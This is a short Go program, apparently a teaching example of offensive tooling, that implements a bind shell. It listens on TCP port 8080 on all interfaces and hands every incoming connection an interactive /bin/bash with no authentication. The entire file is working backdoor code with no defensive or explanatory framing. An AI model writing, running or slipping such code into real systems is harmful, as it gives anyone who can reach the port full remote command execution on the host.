package main

import (
	"bufio"
	"io"
	"log"
	"net"
	"os/exec"
)

//Flusher create a new type to implement Flush() required for windows
type Flusher struct {
	w *bufio.Writer
}

//NewFlusher instantiate the struct
func NewFlusher(w io.Writer) *Flusher {
	return &Flusher{
		w: bufio.NewWriter(w),
	}
}

//Write implement the io.Writer interface
func (foo *Flusher) Write(b []byte) (int, error) {
	count, err := foo.w.Write(b)
	if err != nil {
		return -1, err
	}
	if err := foo.w.Flush(); err != nil {
		return -1, err
	}
	return count, err
}

func handle(conn net.Conn) {

	cmd := exec.Command("/bin/bash", "-i")

	// Set stdin to our connection
	cmd.Stdin = conn

	// Create a Flusher from the connection to use for stdout.
	// This ensures stdout is flushed adequately and sent via net.Conn.
	cmd.Stdout = NewFlusher(conn)

	if err := cmd.Run(); err != nil {
		log.Fatalln(err)
	}

}

func main() {
	listener, err := net.Listen("tcp", ":8080")
	if err != nil {
		log.Fatalln("could not bound port to interface")
	}
	log.Println("listening on 0.0.0.0:8080")

	for {
		conn, err := listener.Accept()
		if err != nil {
			log.Fatalln("couln not accept the connection")
		}
		log.Printf("connection to host %s established", conn.RemoteAddr())
		go handle(conn)
	}
}
